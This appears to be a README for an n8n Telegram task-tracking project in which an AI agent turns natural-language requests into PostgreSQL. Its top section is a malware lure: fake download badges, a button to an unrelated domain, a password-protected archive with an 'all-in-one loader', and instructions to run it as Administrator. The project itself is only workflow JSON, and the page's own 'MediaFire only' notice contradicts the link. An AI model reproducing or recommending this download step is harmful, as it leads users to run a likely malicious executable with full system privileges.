<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Highlights

- **PostgreSQL-backed** — all tasks, users, and logs live in a real relational database, not a spreadsheet or in-memory store. This means it stays fast and reliable as the number of employees, managers, and daily task logs grows — it's built to scale to an entire org, not just a handful of people.
- **Hierarchy-aware permissions** — the system understands org structure (`manager_id` on every user). Employees can only see and edit their own tasks; managers automatically get elevated access to view and edit tasks for their direct reports — enforced directly in the AI agent's logic, no separate admin panel needed.
- **Automatic manager rollups** — managers don't have to chase status updates. Every day, each manager gets a consolidated report summarizing their team's task completion across all their direct reports, so visibility flows upward without anyone having to ask.
- **Controlled using natural language** — no Google Sheets to update. Simply ask the AI agent to add a daily task to a specific employee and it writes clean PostgreSQL itself to insert that task into the database.
- **Structured but flexible** — recurring daily and weekly tasks allow for structure and for weekly or monthly reports later. Extra tasks and uncharted tasks allow for sudden one-off occurrences and tasks without a set deadline.

## What it does

### 1. `Tasking-NL-to-SQL.json` — Chat Interface
Listens for Telegram messages/button taps and lets users manage tasks conversationally:
- Identifies the user by their Telegram chat ID against a `users` table
- An AI Agent (OpenAI) interprets natural-language requests ("What are my tasks today?", "Add a daily task for Alex at 9am") and writes the corresponding PostgreSQL itself
- Enforces role-based permissions in the system prompt: employees can only see/edit their own tasks; managers can read and write tasks for their direct reports only, with a name-lookup-and-confirm step before any write
- Inline Telegram buttons let users mark tasks **done**, **snooze**, or handle **uncharted** (no-deadline) tasks with a tap — handled via callback queries, not just text
- Responds in whichever language the user writes in (built and tested for Arabic/English)

### 2. `Tasking-Notifier.json` — Scheduler & Notifier
Runs on schedules to keep the system proactive instead of purely reactive:
- **Morning preview** — sends each user their task list for the day
- **Hourly reminders** — pings users for tasks due around the current time
- **Uncharted task nudges** — daily reminders for floating tasks with no deadline, until done
- **End-of-day report** — summarizes completed/pending tasks, and notifies a manager if their direct report has open items
- Soft-deletes/cleans up stale task logs

## Architecture

```
[Telegram Trigger] → [Identify user by chat_id] → [AI Agent writes SQL] → [Execute against Postgres] → [Reply / inline buttons]
                                                                                          ↓
                                                                          [Callback: done / snooze / dismiss]

[Schedule Triggers] → [Query due/pending tasks per user] → [Format message] → [Send via Telegram]
                                                                                          ↓
                                                                          [Manager escalation if report has open items]
```

## Screenshots

| Chat interface (NL → SQL) | Scheduler & notifications |
|---|---|
## Database schema

Tables expected in your Postgres schema (referred to as `company` in the workflow — rename to match your own schema):

| Table | Purpose |
|---|---|
| `users` | `user_id, user_name, telegram_chat_id, role, manager_id, is_active` |
| `task_templates` | Recurring task definitions (`daily`/`weekly`) |
| `task_logs` | One row per recurring task instance per day — `status`: `postponed`/`done`/`not done` |
| `extra_tasks` | One-time tasks with a specific reminder datetime |
| `uncharted_tasks` | Floating tasks with no deadline, reminded daily until resolved |

## Setup

1. **Create the Postgres schema** — set up the five tables above (rename the schema from `company` to whatever you use, and update the SQL references throughout both workflows accordingly).
2. **Import both workflows** into n8n.
3. **Create credentials** for Postgres, Telegram, and OpenAI, then attach them to the corresponding nodes.
4. **Populate the `users` table** with each person's `telegram_chat_id` (have them message your bot once to get their chat ID, or use `/getUpdates` on the Bot API), their `role` (`employee`/`manager`), and `manager_id` for reporting structure.
5. **Replace the placeholder `YOUR_TELEGRAM_CHAT_ID`** in the four debug/notify nodes in `Tasking-Notifier.json` with your own chat ID, or remove those nodes if you don't need a personal debug channel.
6. **Adjust schedule triggers** (morning preview, hourly reminders, end-of-day report) to your team's working hours and timezone.
7. Activate both workflows.

## Notes

- The AI Agent's system prompt enforces permission boundaries (employees see only their own tasks; managers see only their direct reports) — review and adapt this logic carefully before relying on it for anything sensitive, since it depends on the LLM following instructions correctly rather than hard database-level row security.
- Credentials are referenced by name only in these exported JSON files — no secrets are embedded. You'll need to recreate/attach your own credentials in n8n after import.
- Bot replies are written in Arabic in several nodes — translate these strings if you need a different language.
- "Alex" is used as a placeholder example name throughout the AI Agent's prompt examples — purely illustrative.

## License

MIT — use, modify, and share freely.


---

MIT License

Copyright (c) 2026 Your Name

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
